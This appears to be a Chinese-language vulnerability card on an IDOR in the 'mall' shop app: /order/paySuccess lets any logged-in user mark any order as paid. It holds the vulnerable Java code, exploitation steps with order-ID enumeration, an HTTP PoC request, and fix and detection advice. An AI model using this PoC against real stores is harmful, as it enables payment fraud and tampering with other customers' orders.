---
id: web-generic-auth-mall-pay-success-idor-zero-cost-order
title: mall APP 端 /order/paySuccess 水平越权：任意用户把他人订单改为已支付实现 0 元购
type: scenario
domain: web
path: web/generic/auth
technique: order-pay-success-idor-trust-client
tags:
- web
- idor
- horizontal-privilege-escalation
- business-logic
- payment
- order
- java
- spring
- mall
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T01:56:47+08:00'
  notes: 已对照原文与7张图片核对：paySuccess 直接以客户端 orderId/payType set status=1、paymentTime 后 updateByPrimaryKeySelective，无归属、金额、支付流水或回调签名校验；图06 orderId=73&payType=1 返回 data=1，图07 status 变为1（待发货）。原文未给 mall 版本；未本地执行请求；frontmatter无sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-mall-pay-success-idor-zero-cost-order/
draft: false
kb_aliases:
- mall 支付回调越权
- paySuccess IDOR
- 任意订单改为已支付
- 0 元购 越权
- 订单支付状态篡改
- 支付回调缺少签名校验
---

## 一句话结论

mall 商城 APP 端的 `POST /order/paySuccess` 把 `orderId`、`payType` 当作客户端可完全控制的数据，直接 `update` 订单为已支付（`status = 1`）并写入支付时间，既不校验订单归属，也不校验支付是否真的发生，任意普通用户都能把他人订单改成已支付，实现 0 元购并破坏交易状态。

## 原理

- Controller 将客户端参数原样传给 Service：
  ```java
  @RequestMapping(value = "/paySuccess", method = RequestMethod.POST)
  public CommonResult paySuccess(@RequestParam Long orderId,
                                 @RequestParam Integer payType) {
      Integer count = portalOrderService.paySuccess(orderId, payType);
      return CommonResult.success(count, "支付成功");
  }
  ```
- Service 直接按主键更新订单，没有先查订单归属、没有校验订单当前状态、没有向支付网关确认交易：
  ```java
  OmsOrder order = new OmsOrder();
  order.setId(orderId);
  order.setStatus(1);            // 1 = 待发货（已支付）
  order.setPaymentTime(new Date());
  order.setPayType(payType);
  orderMapper.updateByPrimaryKeySelective(order);
  ```
- 更新后还会调用 `portalOrderDao.getDetail(orderId)` 并 `updateSkuStock`，恢复下单时锁定的库存、扣减真实库存，使订单进入可发货流程。
- 该接口本应只由支付平台的服务端回调调用，并应校验回调签名、金额、商户订单号与支付流水；实际却暴露在用户端 APP 接口中，只依赖用户登录态，任何会员 token 都能调用。
- 因此攻击者只需知道/枚举 `orderId`，即可跳过支付把订单状态从 0（待付款）改成 1（待发货）；对目标平台可批量篡改他人订单，导致交易系统与库存数据失真。

## 触发条件

- 攻击者拥有一个可登录的普通会员账号。
- `/order/paySuccess` 在用户端可达且只校验登录态，未校验订单归属与支付回调签名。
- 目标 `orderId` 可知或可枚举（自增 ID 常见）。
- 订单当前状态不限制更新（按主键 selective update，通常任意状态都能被覆盖）。

## 利用步骤

1. 注册并登录普通会员账号，获取 `Authorization: Bearer <token>`。
2. 通过订单接口或 ID 遍历获取目标 `orderId`。
3. 向 `/order/paySuccess` 提交目标订单 ID 与任意 `payType`。
4. 响应的 `data` 为受影响行数；随后查询订单详情或数据库，确认 `status` 变为 1、`payment_time` 被写入。
5. 如需复现“0 元购”，在自己账号下单后不付款，直接调用该接口把自己的订单改为已支付，观察订单进入待发货/发货流程。

## PoC

```http
POST /order/paySuccess?orderId=73&payType=1 HTTP/1.1
Host: target:8085
Authorization: Bearer <普通用户 token>
Content-Type: application/json

```

```text
响应：{"code":200,"message":"支付成功","data":1}
数据库核对：oms_order.id=73 的 status 由 0（待付款）变为 1（待发货），
payment_time 被写为当前时间，pay_type 为客户端提交值；订单商品库存被扣减。
```

## 变体与关联

- 变体：所有“支付成功/支付回调/订单完成”接口都应检查：是否要求服务端签名或主动查询支付网关、是否校验金额与商户订单号、是否绑定当前用户、是否限制订单状态迁移。
- 变体：与取消接口组合——先用取消接口关闭他人订单，再用本接口把状态改回已支付，可反复篡改同一订单状态。
- 关联卡片：[[web-generic-auth-mall-cancel-user-order-idor]]（同一商城 `cancelUserOrder` 的水平越权，根因同为订单归属校验缺失）。
- 边界：若接口只接受支付平台来源 IP + 签名，或订单 ID 不可预测，利用难度提高；但只要仍信任客户端 `orderId`/`payType` 且无归属校验，风险依旧存在。

## 检测与防御

- 修复：支付回调必须校验支付平台签名/证书，主动查询支付流水，核对商户订单号、金额与订单归属；订单更新条件加入 `member_id = 当前用户`（用户端发起时）或仅允许服务端回调更新。
- 加固：把订单状态迁移做成状态机，禁止从任意状态直接置为已支付；支付回调接口与用户端接口分离，回调接口不接受的用户 token；对 `payType` 做枚举校验，禁止客户端指定金额/状态。
- 检测：审计“支付时间存在但无对应支付流水/回调记录”的订单；监控同一账号短时间内对大量不同 `orderId` 调用支付成功接口；核对操作者 `memberId` 与订单 `memberId` 是否一致；对自增订单 ID 的遍历行为告警。
